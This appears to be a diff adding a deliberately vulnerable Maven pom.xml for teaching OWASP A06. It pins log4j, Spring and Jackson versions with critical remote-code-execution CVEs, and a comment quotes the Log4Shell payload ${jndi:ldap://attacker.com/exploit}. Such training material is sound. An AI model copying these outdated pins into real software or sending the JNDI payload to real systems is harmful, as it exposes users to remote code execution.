@@ -1,0 +1,75 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  OWASP A06:2021 - Vulnerable and Outdated Components
+  Vulnerability: Dependencies are pinned to versions that contain
+  known critical CVEs. No automated scanning is configured to
+  detect or block vulnerable dependencies during the build.
+
+  CVEs present in this pom.xml:
+    - CVE-2021-44228 (Log4Shell)  CVSS 10.0 CRITICAL  log4j-core 2.14.1
+    - CVE-2022-22965 (Spring4Shell) CVSS 9.8 CRITICAL  spring-webmvc 5.3.0
+    - CVE-2019-14540              CVSS 9.8 CRITICAL  jackson-databind 2.9.8
+
+  To view CVE details: https://nvd.nist.gov/vuln/search
+-->
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
+                             http://maven.apache.org/xsd/maven-4.0.0.xsd">
+  <modelVersion>4.0.0</modelVersion>
+
+  <groupId>com.example</groupId>
+  <artifactId>vulnerable-app</artifactId>
+  <version>1.0.0</version>
+
+  <dependencies>
+
+    <!--
+      VULNERABILITY: Log4j 2.14.1
+      CVE-2021-44228 (Log4Shell) — CVSS 10.0 CRITICAL
+      Remote Code Execution via JNDI lookup in log messages.
+      An attacker sends ${jndi:ldap://attacker.com/exploit} in any logged input field.
+      The logging library connects to the attacker's LDAP server and executes arbitrary code.
+      Fixed in: 2.17.1+
+    -->
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>2.14.1</version>  <!-- VULNERABLE: Log4Shell (CVE-2021-44228) -->
+    </dependency>
+
+    <!--
+      VULNERABILITY: Spring Framework 5.3.0
+      CVE-2022-22965 (Spring4Shell) — CVSS 9.8 CRITICAL
+      Remote Code Execution via data binding on Spring MVC/WebFlux applications
+      running on JDK 9+ with Tomcat as a WAR deployment.
+      Fixed in: 5.3.18+
+    -->
+    <dependency>
+      <groupId>org.springframework</groupId>
+      <artifactId>spring-webmvc</artifactId>
+      <version>5.3.0</version>  <!-- VULNERABLE: Spring4Shell (CVE-2022-22965) -->
+    </dependency>
+
+    <!--
+      VULNERABILITY: Jackson Databind 2.9.8
+      CVE-2019-14540 — CVSS 9.8 CRITICAL
+      Remote Code Execution via unsafe deserialization of attacker-controlled JSON.
+      An attacker crafts a JSON payload referencing a gadget class on the classpath.
+      Fixed in: 2.13.0+
+    -->
+    <dependency>
+      <groupId>com.fasterxml.jackson.core</groupId>
+      <artifactId>jackson-databind</artifactId>
+      <version>2.9.8</version>  <!-- VULNERABLE: Unsafe deserialization RCE (CVE-2019-14540) -->
+    </dependency>
+
+  </dependencies>
+
+  <!--
+    VULNERABILITY: No dependency scanning plugin configured.
+    This build will complete successfully even with critical CVEs present.
+    A developer must manually check versions — which rarely happens.
+  -->
+
+</project>
